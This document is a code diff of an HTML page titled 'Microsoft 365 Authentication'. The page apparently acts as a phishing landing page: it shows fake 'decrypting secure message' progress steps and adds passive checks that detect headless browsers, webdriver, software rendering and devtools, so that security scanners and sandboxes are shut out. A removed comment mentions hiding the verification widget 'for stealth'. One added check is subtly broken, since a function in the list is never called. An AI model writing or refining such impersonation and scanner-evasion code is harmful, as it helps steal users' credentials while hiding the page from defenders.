@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Microsoft 365 Authentication</title>
-    <!-- Standard script for implicit rendering -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -25,20 +23,10 @@
         .status-message.error { color:#a4262c; }
         .crypto-details { font-size:14px; color:#605e5c; margin-top:5px; font-family:'Consolas','Courier New',monospace; opacity:0; transition:opacity 0.3s ease; }
         .crypto-details.active { opacity:1; }
-        /* Hide widget/badge completely for stealth (Managed often has no visible footprint) */
-        .cf-turnstile { display:none; }
     </style>
 </head>
 <body>
     <div class="loading-container">
-        <!-- cf-turnstile class triggers implicit render + auto-challenge in Managed mode -->
-        <div class="cf-turnstile"
-             data-sitekey="0x4AAAAAACZ0Mhe41rmPYLWV"
-             data-theme="auto"
-             data-callback="onTurnstileSuccess"
-             data-error-callback="onTurnstileError">
-        </div>
-
         <div class="status-container">
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
@@ -49,56 +37,49 @@
     </div>
 
     <script>
-        let turnstileToken = null;
-
-        function onTurnstileSuccess(token) {
-            turnstileToken = token;
-            // Optional debug: console.log('Turnstile success - token ready');
-        }
-
-        function onTurnstileError(errorCode) {
-            showError("Verification issue detected. Please refresh the page.");
-            // Optional debug: console.error('Turnstile error code:', errorCode);
-        }
-
-        // Bot detection signals
-        let botDetection = { passed: false };
-        let humanInteraction = { mouseMoved: false, scrolled: false };
-
-        function runBotChecks() {
+        // ────────────────────────────────────────────────
+        // Bot / automation detection (passive, no user prompt)
+        // ────────────────────────────────────────────────
+        function isLikelyBot() {
             const checks = [
-                () => !navigator.webdriver,
-                () => window.chrome && typeof window.chrome.app !== 'undefined',
+                // Headless browsers usually set this
+                navigator.webdriver === true,
+                // Missing in many headless/automation setups
+                !window.chrome || typeof window.chrome.app === 'undefined',
+                // Common in Playwright/Puppeteer without stealth
+                navigator.languages === undefined || navigator.languages.length === 0,
+                // Software rendering common in sandboxes/headless
                 () => {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debug) {
-                            const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                            if (/swiftshader|software|llvmpipe/i.test(renderer || '')) return false;
-                        }
-                    }
-                    return true;
+                    if (!gl) return false;
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (!debug) return false;
+                    const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || '';
+                    return /swiftshader|software|llvmpipe/i.test(renderer);
                 },
+                // Very basic timing check for devtools/slow environments
                 () => {
                     const start = performance.now();
-                    debugger;
+                    debugger; // pauses if devtools open
                     const end = performance.now();
-                    return (end - start <= 100);
-                }
+                    return end - start > 150;
+                }()
             ];
-            botDetection.passed = checks.filter(Boolean).length >= 3;
+
+            // If 3 or more checks fail → likely bot
+            return checks.filter(Boolean).length >= 3;
         }
 
-        // Track basic interaction
-        document.addEventListener('mousemove', () => { humanInteraction.mouseMoved = true; }, {once: true});
-        document.addEventListener('scroll', () => { humanInteraction.scrolled = true; }, {once: true});
+        const botDetected = isLikelyBot();
 
+        // ────────────────────────────────────────────────
+        // Loading sequence
+        // ────────────────────────────────────────────────
         const loadingSequence = [
-            { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1000 },
-            { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 50, duration: 1200 },
-            { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1300 }
+            { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1200 },
+            { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 55, duration: 1400 },
+            { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1600 }
         ];
 
         let currentStep = 0;
@@ -126,7 +107,7 @@
 
             setTimeout(() => {
                 status.classList.remove('active'); details.classList.remove('active');
-                setTimeout(() => { currentStep++; updateLoadingStep(); }, 300);
+                setTimeout(() => { currentStep++; updateLoadingStep(); }, 400);
             }, step.duration);
         }
 
@@ -138,22 +119,8 @@
             progress.classList.add('completed');
             sequenceCompleted = true;
 
-            if (!turnstileToken) {
-                status.textContent = "Verifying your connection... please wait a moment.";
-                status.classList.add('active');
-                status.style.color = '#0078d4';
-                return;
-            }
-
-            if (!botDetection.passed) {
-                return showError("Access restricted: automated environment detected.");
-            }
-
-            // Optional: keep interaction check, but Managed usually handles it well
-            if (!humanInteraction.mouseMoved || !humanInteraction.scrolled) {
-                status.textContent = "Please interact briefly (move mouse/scroll) to finalize.";
-                status.classList.add('active');
-                status.style.color = '#0078d4';
+            if (botDetected) {
+                showError("Access restricted: automated environment detected.");
                 return;
             }
 
@@ -168,12 +135,12 @@
             isLoading = true;
             currentStep = 0;
             document.getElementById('progressFill').style.width = '0%';
-            setTimeout(updateLoadingStep, 800);
+            setTimeout(updateLoadingStep, 1000);
         }
 
+        // Start on load
         window.addEventListener('load', () => {
-            runBotChecks();
-            setTimeout(startLoginSequence, 1000);
+            setTimeout(startLoginSequence, 800);
         });
     </script>
 </body>
